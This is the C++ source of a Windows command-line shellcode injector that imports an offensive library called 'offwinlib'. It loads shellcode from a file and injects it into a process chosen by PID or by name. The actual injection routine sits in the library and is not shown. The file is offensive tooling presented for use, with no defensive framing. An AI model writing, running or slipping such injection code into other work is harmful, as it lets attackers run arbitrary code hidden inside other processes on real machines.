#include <exception>
#include <format>
#include <fstream>
#include <iostream>
#include <stdint.h>
#include <string>
#include <string_view>
#include <vector>

import offwinlib;

static void print_usage()
{
	std::wcout << L"Usage" << std::endl;
	std::wcout << L"\tShellcodeInjector.exe pid SHELLCODE_PATH PID" << std::endl;
	std::wcout << L"\tShellcodeInjector.exe name SHELLCODE_PATH PROCESS_NAME" << std::endl;
}

int wmain(int argc, wchar_t* argv[])
{
	try
	{
		std::vector<std::wstring_view> args(argv, argv + argc);
		if (args.size() < 4)
		{
			print_usage();
			return 1;
		}

		const auto& command = args[1];
		if (command != L"pid" && command != L"name")
		{
			print_usage();
			return 1;
		}
		const auto& shellcode_path = args[2];

		std::wcout << std::format(LR"([*] Loading shellcode from {}...)", shellcode_path) << std::endl;
		std::ifstream shellcode_file{std::wstring{shellcode_path}, std::ios::binary};
		std::vector<uint8_t> shellcode((std::istreambuf_iterator<char>(shellcode_file)), std::istreambuf_iterator<char>());
		shellcode_file.close();
		std::wcout << std::format(LR"([+] {} bytes of shellcode loaded.)", shellcode.size()) << std::endl;

		if (command == L"pid")
		{
			auto pid = std::stoi(std::wstring{args[3]});
			std::wcout << std::format(LR"([*] Injecting shellcode into process with pid {}...)", pid) << std::endl;
			owl::injection::shellcode_inject(pid, shellcode);
			std::wcout << L"[+] Shellcode injected." << std::endl;
		}
		else if (command == L"name")
		{
			auto process_name = std::wstring{args[3]};
			std::wcout << std::format(LR"([*] Finding all processes named {}...)", process_name) << std::endl;
			auto pids = owl::misc::get_pids_from_process_name(process_name);
			if (pids.empty())
			{
				std::wcout << L"[-] No processes found with the specified name." << std::endl;
				return 1;
			}
			std::wcout << std::format(LR"([+] Number of processes found with the specified name: {})", pids.size()) << std::endl;

			std::wcout << std::format(LR"([*] Injecting shellcode into process with pid {}...)", pids[0]) << std::endl;
			owl::injection::shellcode_inject(pids[0], shellcode);
			std::wcout << L"[+] Shellcode injected." << std::endl;
		}
	}
	catch (const std::exception& e)
	{
		std::wcout << L"[-] " << e.what() << std::endl;
		return 1;
	}

	return 0;
}
